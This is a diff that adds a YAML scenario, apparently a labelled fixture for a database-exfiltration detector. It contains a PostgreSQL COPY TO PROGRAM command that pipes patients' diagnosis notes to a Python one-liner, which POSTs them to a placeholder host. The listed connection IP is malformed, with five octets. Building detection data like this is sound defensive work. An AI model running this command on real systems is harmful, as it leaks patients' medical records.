@@ -1,0 +1,31 @@
+scenario_id: gen_healthcare_69_copy_to_program_mal_2016m
+family_id: gen_healthcare_69_copy_to_program_fam_2016
+domain: healthcare
+time_of_day: 03:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT diagnosis_notes, diagnosis_code FROM medical_records) TO PROGRAM
+      'python3 -c "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://clearinghouse-batch.example/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 185.220.101.89.70
+      port: 9001
+matched_pair_id: gen_healthcare_69_copy_to_program_pair_2016
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
